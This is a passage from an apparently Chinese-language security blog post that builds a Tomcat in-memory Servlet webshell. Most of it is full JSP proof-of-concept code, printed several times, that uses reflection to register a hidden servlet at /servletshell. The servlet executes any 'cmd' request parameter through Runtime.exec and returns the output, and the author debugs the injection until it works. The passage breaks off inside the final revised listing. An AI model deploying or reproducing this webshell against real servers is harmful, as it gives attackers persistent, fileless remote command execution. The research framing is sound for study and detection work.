class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //修改状态</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //尝试注入</span><br><span class=\"line\">    String servletName=&quot;servletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.println(standardContext.findChildren());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>可以看到已经添加进去了，但是访问该路由却是503，并且正常页面也变成503了，猜测是破坏了内存中的结构之类的</p>\n<p>不好意思，是我sb了，没把状态修改回来。只需要在后面添加如下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>不过，访问变成了404</p>\n<p>现在来分析一下为啥没有正常访问到，在 <code>ApplicationFilterChain#</code>`internalDoFilter <code>中调用</code> servlet <code>的</code> service` 方法处打个断点</p>\n<p>可以看到这里获取到的是 <code>DefaultServlet</code> ，而不是我们注入的 <code>ServletShell</code> ，我们现在就来追踪一下这个servlet的来源，该servlet是通过 <code>setServlet</code> 方法进行赋值的，在该方法处打个断点</p>\n<p>在<code>ApplicationFilterFactor#createFilterChain</code>方法中调用该方法进行赋值</p>\n<p>继续往前追踪，在<code>StandardWrapperValv#invoke</code>可以看到</p>\n<p>servlet是 <code>wrapper.allocate</code> 的返回值，跟进一下这个方法</p>\n<p>简单看一下可知，这里是返回了 <code>instance</code> 属性的值，那么此时我们要继续追寻 <code>instance</code> 属性的来源，直接看一下 <code>wrapper</code> 是咋来的</p>\n<p>跟进 <code>getContainer</code></p>\n<p>对应的赋值方法为 <code>setContainer</code> ，在那打个断点，然后没断下来，说明没有调用到该方法，然后看到上层的<code>StandardContextValve#invoke</code></p>\n<p>可以看到wrapper已经被赋值了，该 <code>wrapper</code>是从 <code>request</code>中获取的，那么我们又要继续追溯 <code>request</code> 对象的来源了，看到<code>org.apache.catalina.connector.CoyoteAdapter#service</code></p>\n<p>这里获取了 <code>request</code> 对象，然后在下面调用了<code>postParseRequest</code> 处理</p>\n<p>跟进</p>\n<p>这里算是一个关键地方，后面就是map方面的操作了</p>\n<p>跟踪到这里，也就是<code>org.apache.catalina.mappe.Mapper#internalMap</code>的时候，发现了一个关键的属性 <code>contextVersion</code></p>\n<p>可以看到 <code>contextVersion</code>中的 <code>exactWrappers</code> 中存储了我们自定义的其他两个servlet的 <code>wrapper</code> ，但是我们动态注入进去的servlet却没有，这貌似也就解释了响应码是404的原因。那么如果我们能将需要注入的servlet的wrapper添加到这里面，就可以成功了呢？说干就干，先找一下有没有方法可以将wrapper插入进去，还真有一个 <code>addWrapper</code> 方法</p>\n<p>要使用这个方法，我们就需要获取到 <code>contextVersion</code> ，还要创建一个自定义的 <code>wrapper</code></p>\n<p>先解决第一个问题 — 获取 <code>contextVersion</code></p>\n<p>无意之间看到了这么一行代码</p>\n<p>然后去看了看 <code>contextObjectToContextVersionMap</code></p>\n<p>里面果然存储了 <code>contextVersion</code> ，那么我们也就可以通过这个属性获取到 <code>contextVersion</code>,那么现在的问题就变成了获取<code>contextObjectToContextVersionMap</code> ，只要我们获取到这个mapper对象，也就可以顺理成章的获取到这个属性。所以问题又变成了获取mapper对象，这时我们看到之前说的那个关键操作点</p>\n<p>这里先获取到service属性在调用 <code>getMapper</code> 获取到 <code>mapper</code> 对象，那么我们现在就要想办法去获取到这个 <code>StandardService</code> ，后面调试了半天，到处追踪，终于看到了希望</p>\n<p>可以看到在 <code>ApplicationContext</code> 中有 <code>service</code> 这个属性，而 <code>ApplicationContext</code> 我们已经能够获取到了，所以问题圆满解决。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>继续看第二个问题 — 创建自定义 <code>wrapper</code></p>\n<p>在 <code>StandardContext</code>中，存在 <code>createWrapper</code> 方法，我们可以通过该方法来创建自定义的 <code>wrapper</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//创建自定义wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br></pre></td></tr></table></figure>\n\n<p>然后我们组合一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //修改状态</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //尝试注入</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //创建自定义wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>但是访问还是报500，看一下是否将wrapper正确添加了</p>\n<p>可以看到确实将wrapper添加了进去，但是格式不太对，回去看了一下wrapper的属性，原来是没有设置 <code>parent</code> 属性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellWrapper.setParent(standardContext);</span><br></pre></td></tr></table></figure>\n\n<p>添加这一行即可，修改后的poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //修改状态</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //尝试注入</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //创建自定义wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    